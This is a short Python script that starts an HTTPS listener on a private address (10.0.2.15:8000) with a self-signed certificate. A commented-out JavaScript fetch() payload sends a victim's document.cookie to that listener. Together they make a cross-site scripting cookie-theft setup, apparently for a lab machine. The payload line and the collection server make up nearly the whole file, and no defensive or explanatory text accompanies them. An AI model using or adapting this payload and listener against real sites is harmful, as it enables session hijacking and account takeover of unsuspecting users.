from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import os

print("IP SERVER: ")
os.system("ip a")

print("\n\n\n")

#fetch('https://10.0.2.15:8000/', {method: 'POST', mode: "no-cors",headers: {"Access-Control-Allow-Origin":"*"},body: document.cookie}).then(response => response.json()).then(response => console.log(JSON.stringify(response)))

httpd = HTTPServer(('10.0.2.15', 8000), BaseHTTPRequestHandler)

httpd.socket = ssl.wrap_socket (httpd.socket, 
        keyfile="/etc/ssl/private/ssl-cert-snakeoil.key", 
        certfile='/etc/ssl/certs/ssl-cert-snakeoil.pem', server_side=True)

httpd.serve_forever()